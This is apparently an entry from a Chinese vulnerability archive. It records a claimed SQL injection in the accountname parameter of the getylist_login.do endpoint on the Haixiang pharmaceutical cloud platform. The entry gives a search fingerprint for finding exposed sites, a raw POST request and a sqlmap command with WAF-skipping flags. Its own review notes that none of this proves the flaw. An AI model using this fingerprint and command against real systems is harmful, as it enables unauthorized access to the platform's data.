---
source: "wy876 漏洞文库"
title: "海翔药业云平台 getylist_login accountname SQL注入声称"
product: "海翔药业云平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本/数据库未知"
prerequisites: "带JSESSIONID，是否匿名未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/bn1l8e2pqvvd28hg"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%B5%B7%E7%BF%94%E8%8D%AF%E4%B8%9A/%E6%88%90%E9%83%BD%E6%B5%B7%E7%BF%94%E8%BD%AF%E4%BB%B6%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%B5%B7%E7%BF%94%E8%8D%AF%E4%B8%9A%E4%BA%91%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5.md"
fofa_unverified: "web.title="
hunter: "web.title=\"登录海翔\""
id: "vw-caf3b8f5b7d82378a8e0b5b0"
entity_id: "ve-caf3b8f5b7d82378a8e0b5b0"
schema_version: "1"
---

# 海翔药业云平台 getylist_login accountname SQL注入声称

## 条目说明

- 对象与具体问题：海翔药业云平台；getylist_login accountname SQL注入声称
- 版本、配置及部署条件：版本/数据库未知
- 认证与权限前提：带JSESSIONID，是否匿名未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 只有accountname=1正常请求和sqlmap命令，无注入或响应输出，不能证明SQLi
- Cookie __session等残留格式异常需回原始报文核对；skip-waf参数不构成绕过证明
- 标题厂商较明确但缺发行版本/补丁/数据库条件

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
成都海翔软件有限公司海翔药业云平台存在 sql 注入

## 二 、影响版本
+ 海翔药业云平台

## 三、资产测绘
+ hunter`web.title="登录海翔"`
+ 特征


## 四、漏洞复现
漏洞位置，搜索账套处


```http
POST /getylist_login.do HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 13
Connection: close
Cookie: JSESSIONID=CC105C5EED7D5DE8BFCB92D7F4BB74DC; __session:0.5376174871119012:=http:

accountname=1
```

> 请求长度说明：原资料 Content-Length 为 13；保留原始标头；其数值未据实际请求体重新计算或验证。

sqlmap

```plain
sqlmap -r 1.txt  --skip-waf --batch
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bn1l8e2pqvvd28hg>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
